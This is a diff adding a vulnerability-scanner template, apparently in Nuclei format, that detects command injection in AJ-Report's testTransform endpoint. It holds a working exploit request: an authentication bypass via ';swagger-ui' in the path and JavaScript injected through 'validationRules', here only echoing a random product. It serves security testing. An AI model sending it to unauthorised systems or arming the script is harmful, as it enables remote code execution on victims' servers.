@@ -1,0 +1,30 @@
+id: poc-aj-report-testtransform-rce
+info:
+  name: AJ-Report testTransform Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,aj-report
+
+variables:
+  t1: "{{rand_int(100,199000)}}"
+  t2: "{{rand_int(100,19000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
+
+http:
+  - raw:
+      - |
+        POST /dataSet/testTransform;swagger-ui HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"dynSentence": "{\"apiUrl\":\"\",\"method\":\"\",\"header\":\"{\\\"Content-Type\\\":\\\"\\\"}\",\"body\":\"\"}","dataSetParamDtoList":[{"paramName":"","paramDesc":"","paramType":"","sampleItem":"","mandatory":true,"requiredFlag":2,"validationRules":"throw new Error({{t1}}*{{t2}});"}],"dataSetTransformDtoList":[{"transformType":"js","transformScript":""}],"setType":"http"}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t3}}"
+        part: body
